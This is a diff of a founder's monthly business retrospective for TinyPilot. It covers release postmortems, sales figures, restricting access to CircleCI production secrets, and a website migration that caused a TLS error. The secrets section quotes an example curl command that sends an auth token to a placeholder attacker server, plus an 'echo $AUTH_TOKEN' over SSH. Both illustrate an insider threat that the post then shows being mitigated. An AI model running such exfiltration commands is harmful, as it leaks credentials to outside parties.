@@ -2,6 +2,8 @@
 title: "TinyPilot: Month 45"
 date: 2024-04-11T00:00:00-04:00
 description: Thinking critically about deployments.
+images:
+  - /retrospectives/2024/04/og-cover.webp
 ---
 
 {{<notice type="info">}}
@@ -16,7 +18,7 @@ Every month, I publish a retrospective like this one to share how things are goi
 ## Highlights
 
 - I worked with the TinyPilot team to lock down access to deployment secrets without interfering with our workflows.
-- I learned from my mistakes in how to limit downtime when migrating services between platforms.
+- I learned from my mistakes to limit downtime when migrating services between platforms.
 - I wrote my first compiler, albeit an extremely simple one.
 
 ## Goal Grades
@@ -28,7 +30,7 @@ At the start of each month, I declare what I'd like to accomplish. Here's how I 
 - **Result**: Filled in the gaps we discovered on the last release.
 - **Grade**: A
 
-Our March TinyPilot Pro release was the first where [I didn't perform any release tasks directly](/retrospectives/2024/03/#it-turns-out-we-have-a-25-step-release-process). The release went smoothly, but there were points during the process where the next steps were unclear.
+Our March TinyPilot Pro release was the first where [I didn't perform any release tasks directly](/retrospectives/2024/03/#it-turns-out-we-have-a-25-step-release-process). The release went smoothly, but there were points during the process where the next steps were unclear to the team.
 
 I held postmortems with the dev and support engineering teams to gather feedback about the release. Those meetings generated a lot of useful feedback about the process, and we've revised our internal documentation and playbooks to address the hiccups we ran into.
 
@@ -54,32 +56,34 @@ I had complicated taxes this year because it's my first year married filing join
 
 March was TinyPilot's strongest month of sales revenue in history, narrowly beating [our previous record](/retrospectives/2022/12/#tinypilothttpstinypilotkvmcomrefmtlynchio-stats) by $600. Profit at the one-month granularity is down, but the three-month average is the more meaningful metric, and that's looking strong.
 
-Visits are down from last month but only because February had an atypical surge in visits because of my [year six review](/solo-developer-year-6/) post.
+Visits are down from last month but only because February had an atypical surge in visits from my [year six review](/solo-developer-year-6/) post.
 
 ## Tightening access to TinyPilot's production secrets
 
 Over the past few months, we've been [improving TinyPilot's release process](/retrospectives/2024/03/#it-turns-out-we-have-a-25-step-release-process) so that it's more automated and less dependent on me.
 
-In reviewing our release workflow, we realized that too many team members had access to production secrets. Production secrets include things like authentication tokens that allow our automated systems to publish new versions of our website or the TinyPilot application.
+In reviewing our release workflow, we realized that too many team members had access to production secrets. Production secrets include things like authentication tokens for publishing new versions of our website or the TinyPilot application.
 
-We're a small team, so in our case, "too many" was five people instead of just one. Still, four people had access to production secrets that didn't need them.
+We're a small team, so in our case, "too many" team members having access meant five people instead of one. Still, four people had access to production secrets that didn't need them.
 
 Most TinyPilot repositories are ["push on green,"](https://www.usenix.org/publications/login/october-2014-vol-39-no-5/making-push-green-reality) meaning that we push every code change to production after it passes our automated tests on CircleCI, our continuous integration service.
 
-We store our secrets as CircleCI environment variables. This initially seemed fine because environment variables are write-only, meaning that you can't read the values after storing them in CircleCI.
+We store our secrets as CircleCI environment variables. This initially seemed fine because environment variables are write-only, meaning that you can't read the values after you store them.
 
 {{<img src="ci-env-vars.webp" has-border="true" max-width="700px" caption="CircleCI's admin interface only shows a portion of the values of environment variables, and only the CircleCI admin can see them. Note that I'm showing fake values.">}}
 
-Once we started thinking more critically about protecting secrets, we realized that despite what CircleCI's web UI suggested, everyone within the TinyPilot Github organization effectively had access to our environment variables. A malicious team member with access to TinyPilot source code could extract secrets in one of two ways:
+Once we started thinking more critically about protecting secrets, we realized that despite what CircleCI's web UI suggested, all five team members effectively had access to our environment variables. A malicious team member could extract secrets in one of two ways:
 
-1. They could create a new branch in our source code tree and then push a change to our CircleCI config file that exfiltrates a secret to a remote server they control, like `curl http://attacker-server.example.com/exfiltrate?token=$AUTH_TOKEN`
+1. They could create a new branch in our code repository and then push a change to our CircleCI config file that exfiltrates a secret to a remote server they control, like `curl http://attacker-server.example.com/exfiltrate?token=$AUTH_TOKEN`
 1. They could SSH in to CircleCI for any job and type `echo $AUTH_TOKEN` on the command line.
 
 (1) was semi-possible to detect, but it wasn't something we ever checked. (2) was impossible to detect, as CircleCI doesn't log SSH sessions.
 
-We looked into tightening access, and CircleCI's recommendation was to store security-sensitive secrets in "contexts." Contexts are still environment variables, but CircleCI lets you define more granular access to them.
+The attack would have to come from within the TinyPilot team, as third-party contributors don't have access to CircleCI environment variables at all.
 
-Security contexts only allowed you to restrict access to environment variables to a particular set of people. So, we could have maintained our existing workflow by giving everyone access to the secrets, but then we're back where we started. We could have arbitrarily decided that some subset of the team is trusted and has to initiate every deployment, but that would have added tremendous friction.
+We looked into tightening access, and CircleCI's documentation recommended storing security-sensitive secrets in "contexts." Contexts are still environment variables but with additional access controls.
+
+Security contexts only allowed you to restrict access to a particular set of people. So, we could have maintained our existing workflow by giving everyone access to the secrets, but then we're back to square one. We could have arbitrarily decided that some subset of the team is trusted and has to initiate every deployment, but that would have added tremendous friction.
 
 We reached out to CircleCI support, and they said they were coincidentally about to release something that would solve our problem. Two weeks later, CircleCI launched [expression-based context restrictions](https://circleci.com/changelog/expression-based-context-restrictions/), which did, in fact, perfectly solve our problem.
 
@@ -91,9 +95,9 @@ pipeline.git.branch == "master" and not job.ssh.enabled
 
 This expression mitigates attack (1) above because a malicious team member who tries to exfiltrate a secret using a branch would not have access to the secret in their branch.
 
-The express mitigates attack (2) by just making the secret unavailable when a user initiates a CircleCI job with SSH access.
+The expression mitigates attack (2) by just making the secret unavailable when a user initiates a CircleCI job with SSH access.
 
-This system is still vulnerable to two team members teaming up to do something malicious. One corrupt team member could introduce a code change that exfiltrates a secret, and their co-conspirator could approve it. But this would be a particularly noticeable attack, as the change would be in a file we frequently work on, and there'd be a clear audit trail of who put it there.
+Our `master` branches require at least one approval for any change, so this system is still vulnerable to an attack from two team members doing something malicious together. One corrupt team member could introduce a code change that exfiltrates a secret, and their co-conspirator could approve it. But this would be a particularly noticeable attack, as the change would be in a file we frequently work on, and there'd be a clear audit trail of who put it there.
 
 Overall, I'm happy with CircleCI's expression-based context restrictions. If you're on a team where CI has access to production secrets, I recommend thinking about whether too many team members have access to secrets they don't need.
 
@@ -101,7 +105,7 @@ Overall, I'm happy with CircleCI's expression-based context restrictions. If you
 
 When I started TinyPilot, I tended to host services on large providers like Google Cloud Platform and Amazon Web Services. Over the last four years, I've come to prefer smaller vendors like Netlify and Fly.io.
 
-Most of TinyPilot's services run on smaller hosting platforms, but we still had a couple of services running that I set up at the beginning and never moved, so I decided to consolidate.
+Most of TinyPilot's services run on smaller hosting platforms, but we still had a couple of services I set up at the beginning and never moved, so I decided to consolidate.
 
 One of the migrations was a bit bumpy, and I used the lessons to make the next one smoother.
 
@@ -113,7 +117,11 @@ It seemed like it would be a simple migration. There's no database or anything t
 
 Or so I thought.
 
-I published to Netlify, updated the DNS entries for `tinypilotkvm.com`, tried visiting the site, and: TLS error. Uh oh. That's bad. Nobody wants to shop on a site that's serving a TLS error.
+I published to Netlify, updated the DNS entries for `tinypilotkvm.com`, tried visiting the site, and: TLS error.
+
+{{<img src="tls-error.webp" max-width="650px" caption="Immediately after updating DNS entries, I saw a TLS error when visiting the TinyPilot website." alt="Screenshot of Firefox visiting tinypilotkvm.com, and the browser shows 'Warning: Potential Security Risk Ahead'">}}
+
+Uh oh. That's bad. Nobody wants to shop on a site right after the browser just told them it was going to steal their credit card information.
 
 Worse, I made this change at 9:30 AM ET on a Thursday, so it was during hours when we receive most of our paying customers.
 
